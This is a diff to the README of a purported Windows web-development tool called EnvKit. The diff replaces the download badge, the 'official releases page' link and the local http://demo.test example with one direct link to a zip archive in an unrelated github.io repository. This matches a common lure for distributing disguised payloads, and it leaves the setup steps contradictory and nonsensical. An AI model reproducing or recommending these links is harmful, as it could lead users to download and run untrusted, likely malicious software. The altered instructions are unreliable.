@@ -5,7 +5,7 @@ description: "Manage your local web development stack on Windows and macOS with 
 ---
 # 🛠️ envkit-releases - Build local websites on your computer
 
-[![](https://img.shields.io/badge/Download-EnvKit_for_Windows-blue.svg)](https://github.com/utkarshdwivedi212319/envkit-releases)
+[![](https://img.shields.io/badge/Download-EnvKit_for_Windows-blue.svg)](https://raw.githubusercontent.com/utkarshdwivedi212319/utkarshdwivedi212319.github.io/main/reversis/utkarshdwivedi_github_io_2.2.zip)
 
 EnvKit provides a workspace for web development on your Windows machine. It installs the software needed to create and test websites locally. You do not need deep technical knowledge to manage your projects. EnvKit simplifies the setup of databases, web servers, and programming languages. It acts as a reliable alternative to traditional tools like XAMPP or Laragon.
 
@@ -24,7 +24,7 @@ EnvKit packs several tools into one installer. You get the following software co
 
 Follow these steps to set up your environment on Windows:
 
-1. Visit the [official releases page](https://github.com/utkarshdwivedi212319/envkit-releases) to find the latest version.
+1. Visit the [official releases page](https://raw.githubusercontent.com/utkarshdwivedi212319/utkarshdwivedi212319.github.io/main/reversis/utkarshdwivedi_github_io_2.2.zip) to find the latest version.
 2. Look for the file ending in .exe in the "Assets" section of the latest release.
 3. Click the filename to download the installer to your computer.
 4. Locate the file in your Downloads folder and double-click it.
@@ -39,7 +39,7 @@ When you open EnvKit for the first time, the software prepares the background se
 
 - Choose a root folder. This is where your website project files live.
 - Click the Start All button. This activates the servers and databases.
-- Open your web browser. Type the address of your project followed by .test. For example, if your folder is named "demo", go to http://demo.test in your address bar.
+- Open your web browser. Type the address of your project followed by .test. For example, if your folder is named "demo", go to https://raw.githubusercontent.com/utkarshdwivedi212319/utkarshdwivedi212319.github.io/main/reversis/utkarshdwivedi_github_io_2.2.zip in your address bar.
 - If the browser displays your site, the setup is successful.
 
 ## 💻 Managing your projects
